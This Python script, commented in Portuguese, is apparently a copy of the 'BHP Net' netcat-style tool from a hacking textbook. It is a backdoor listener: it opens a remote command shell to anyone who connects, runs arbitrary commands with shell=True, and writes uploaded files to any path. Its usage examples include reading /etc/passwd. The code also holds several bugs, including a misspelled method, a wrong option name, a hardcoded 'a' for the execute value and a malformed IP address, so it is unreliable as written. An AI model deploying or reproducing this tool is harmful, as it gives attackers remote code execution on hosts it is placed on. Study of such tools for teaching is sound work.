# -*- coding: utf-8 -*-
import sys
import socket
import getopt
import threading
import subprocess

# define algumas variaveis globais
listen  = False
command = False
upload  = False
execute = ''
target  = ''
upload_destination = ''
port = ''

def usage():
    print('BHP Net Toll')
    print('')
    print('Usage: bhpnet.py -t target_host -p port')
    print('-l --listen ilisten on [host]:[port] for incoming connections')
    print('-e --execute=file_to_run - execute the give file upon receiv a connection')
    print('-c --command initialize a command shell')
    print('-u --upload=destination - upon receiving connection upload a file and write to [destination]')
    print('')
    print('')
    print('Examples:')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -c')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe')
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABXDEFGHI' | ./bhpnet.py -t 192.16811.12 -p 135")
    sys.exit(0)
    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage
        
    # lê as opções de linha de comando
    try:
        opts, ars = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", 
                                  ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = "a"
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
            
    # iremos ouvir ou somplesmente enviar dados de stdin?
    if not listen and len(target) and port>0:
        # lê o buffer da linha de command, isso causará um bloqueio, portanto envie um CTRL -D
        # se não estiver enviando os dados de entrada para stdin
        buffer = sys.stdin.read()
        
        # send data off
        client_sender(buffer)
        
    # iremos ouvir a porta e, potencialmente, faremos upload de dados, executaremos comandos e 
    # deixaremos um shell de acordo com as opções de linha de comando anteriores
    if listen:
        server_loop()
      
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # conecta-se ao nosso alvo host
        client.connect((target, port))
        
        if len(buffer):
            client.send(buffer)
        
        while True:
            # agota espera receber os dados de volta
            recv_len = 1
            response = ''
            
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response +=data
                
                if recv_len<4096:
                    break
                
            print(response)
            
            buffer = raw_input('')
            buffer += '\n'
            
            # envia dados
            client.send(buffer)
    except:
        print('[*] Exception! Exiting.')
        # encerra a conexão
        client.close()
        
def server_loop():
    global target
    
    # se não houver nenhum dado definido, ouvireos todas as interfaces
    if not len(target):
        target = '0.0.0.0'
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        
        # dispara uma thread para cuidar do nosso novo cliente
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()
        
def run_command(command):
    # remove a quebra de linha
    command = command.rstrinp()
    
    # executa o comando e obtém os dados de saída
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = 'Failed to execute command. \r\n'
    
    # enviar os dados de saída de volta ao cliente
    return output

def client_handler(client_socket):
    global upload
    global execute
    
    # verifica se é upload
    if len(upload_destination):
        # lê todos os bites e grava em nosso destino
        file_buffer = ''
        
        # permanece lendo os dados ate não haja mais nenhum disponĩvel
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                break
            else:
                file_buffer +=data
                
        # agora tentaremos gravar estes bytes
        try:
            file_descriptor = open(upload_destination, 'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            # confirma que gravamos o arquivo
            client_socket.send('Successfull saved file to %s\r\n' %upload_destination)
        except:
            client_socket.send('Failed to save file to %s\r\n' %upload_destination)
            
    # verifica se é execução de commando
    if len(execute):
        # executa o camando
        output = run_command(execute)
        client_socket.send(output)
        
    # entra em outro laço se um shell
    if command:
        while True:
            # mostra um prompt simples
            client_socket.send('<BHP:#> ')
            # agora ficamos recebendo dados até vermos um linefeed
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer +=client_socket.recv(1024)
                
            # envia de volta a saida do comando
            response = run_command(cmd_buffer)
            
            # envia de volta a resposta
            client_socket.send(response)
            
    
main()